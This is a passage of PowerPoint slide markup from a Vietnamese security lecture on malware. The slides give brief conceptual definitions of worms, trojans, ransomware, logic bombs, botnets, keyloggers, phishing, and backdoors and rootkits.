                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mobile phone worms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Lỗ hổng phía client</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Drive-by-download: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>khai thác lỗ hổng trình duyệt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Clickjacking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, keystrokes hijacking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:endParaRPr lang="en-US" sz="2400"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5022906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219200" y="152400"/>
            <a:ext cx="10972800" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền kỹ nghệ xã hội - Spam email, Trojan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1981200"/>
            <a:ext cx="11201400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Spam</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">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Hầu hết đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc sử dụng bởi botnet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Dùng để quảng cáo, vận chuyển malware, tấn công phishing,…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Trojan horse</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> L</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>à một chương trình hữu ích, hay</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> có vẻ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> hữu ích, có chứa mã ẩn, khi được gọi, thực hiện một số chức năng không mong muốn hoặc có hại.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">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Thực hiện chức năng của ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình gốc + chức năng độc hại riêng biệt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">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Thực hiện chức năng của ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình gốc có chỉnh sửa thêm để thực hiện hành vi độc hại</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">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Thực hiện chức năng độc hại thay thế hoàn toàn chức năng của chương trình gốc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mobile phone trojan </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:endParaRPr lang="en-US" sz="2400"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8924808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219200" y="152400"/>
            <a:ext cx="10972800" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hành vi – Phá vỡ hệ thống</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1981200"/>
            <a:ext cx="11201400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Data destruction: phá hủy dữ liệu máy tính mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Data encryption (ransomware): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>một số phần mềm độc hại mã hóa dữ liệu của người dùng và yêu cầu thanh toán để truy cập khoá cần thiết để phục hồi thông tin này</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">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a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Real-world damage: gây thiệt hại đến các thiết bị vật lý</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Logic bomb: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mã nhúng trong phần mềm độc hại được thiết lập để "phát nổ" khi điều kiện nhất định được đáp ứng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:endParaRPr lang="en-US" sz="2400"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2703193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219200" y="152400"/>
            <a:ext cx="10972800" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hành vi – Agent tấn công – Zoombie, bots</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1752600"/>
            <a:ext cx="11201400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Chương trình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chiếm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quyền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kiểm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soát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> các máy tính khác và khởi chạy các cuộc tấn công</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pP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cuộc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tấn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lần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ra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dấu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nếu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phối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hợp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tạo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thành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một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mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> botnet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đặc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điểm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cơ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sở</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điều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khiển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từ</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yếu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tố</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biệt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Qua IRC/HTTP, peer-to-peer…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cơ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chế</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truyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" algn="just">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phần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mềm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tấn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lỗ</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hổng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chiến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lược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quét</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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biện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pháp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đối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phó</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nhau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (IDS, honeypots,…)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>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619864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219200" y="228600"/>
            <a:ext cx="10972800" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Hành vi - Đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ánh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cắp</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thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>– Keylogger, Phishing, Spyware</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1606378"/>
            <a:ext cx="10670125" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>K</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>eyloggers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, spyware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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Phishing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Spear </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>phising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hoạt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động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như</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một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nguồn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đáng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cậy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một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mục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tiêu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cụ</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thể</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6973494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371600" y="228600"/>
            <a:ext cx="9261024" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hành vi ẩn giấu – Backdoor, rootkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
